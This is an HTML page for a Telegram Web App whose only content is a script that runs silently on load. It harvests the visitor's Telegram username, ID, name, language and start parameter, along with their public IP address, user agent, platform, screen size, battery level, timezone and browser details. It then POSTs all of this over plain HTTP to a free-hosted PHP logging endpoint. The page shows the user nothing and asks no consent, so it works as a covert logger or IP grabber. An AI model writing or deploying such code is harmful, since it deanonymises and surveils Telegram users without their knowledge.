<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <script>
        let tg = window.Telegram.WebApp;

        function getBrowserInfo() {
            let ua = navigator.userAgent, tem, 
            matchTest = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            if (/trident/i.test(matchTest[1])) {
                tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
                return {name: 'IE', version: (tem[1] || 'неизвестно'), engine: 'Trident'};
            }
            if (matchTest[1] === 'Chrome') {
                tem = ua.match(/\b(OPR|Edg)\/(\d+)/);
                if (tem != null) return {name: tem[1].replace('OPR', 'Opera'), version: tem[2], engine: 'Blink'};
            }
            matchTest = matchTest[2] ? [matchTest[1], matchTest[2]] : [navigator.appName, navigator.appVersion, 'неизвестно'];
            if ((tem = ua.match(/version\/(\d+)/i)) != null) matchTest.splice(1, 1, tem[1]);
            return {name: matchTest[0], version: matchTest[1], engine: 'неизвестно'};
        }

        async function getBatteryInfo() {
            try {
                let battery = await navigator.getBattery();
                return battery.level ? battery.level * 100 : 'неизвестно';
            } catch {
                return 'неизвестно';
            }
        }

        async function getIpAddress() {
            try {
                let response = await fetch('https://api.ipify.org?format=json');
                let data = await response.json();
                return data.ip;
            } catch (error) {
                return 'неизвестно';
            }
        }

        let screenResolution = `${window.screen.width || 'неизвестно'}x${window.screen.height || 'неизвестно'}`;

        let osName = navigator.platform || 'неизвестно';

        let browserInfo = getBrowserInfo();

        async function collectAndSendData() {
            let batteryPercentage = await getBatteryInfo();
            let ipAddress = await getIpAddress();
            let userAgent = navigator.userAgent || 'неизвестно';
            let chat = tg.initDataUnsafe.start_param || 'неизвестно';
            let username = tg.initDataUnsafe.user.username || 'неизвестно';
            let id = tg.initDataUnsafe.user.id || 'неизвестно';
            let name = tg.initDataUnsafe.user.first_name || 'неизвестно';
            let surname = tg.initDataUnsafe.user.last_name || 'неизвестно';
            let language = tg.initDataUnsafe.user.language_code || 'неизвестно';
            let allows = tg.initDataUnsafe.user.allows_write_to_pm || 'неизвестно';
            let time = new Date().getTimezoneOffset() || 'неизвестно';
            let browserName = browserInfo.name || 'неизвестно';
            let browserVersion = browserInfo.version || 'неизвестно';
            let browserEngine = browserInfo.engine || 'неизвестно';

            let data = {
                chat: chat,
                username: username,
                id: id,
                name: name,
                surname: surname,
                language: language,
                allows: allows,
                ip: ipAddress,
                useragent: userAgent,
                osname: osName,
                resolution: screenResolution,
                battery: batteryPercentage,
                time: time,
                browsername: browserName,
                browserver: browserVersion,
                browserv: browserEngine
            };

            fetch('http://masterly-hoof.000webhostapp.com/logapu.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    console.log('Data sent successfully');
                } else {
                    console.error('Error sending data');
                }
            }).catch(error => {
                console.error('Network error:', error);
            });
        }

        collectAndSendData();
    </script>
</body>
</html>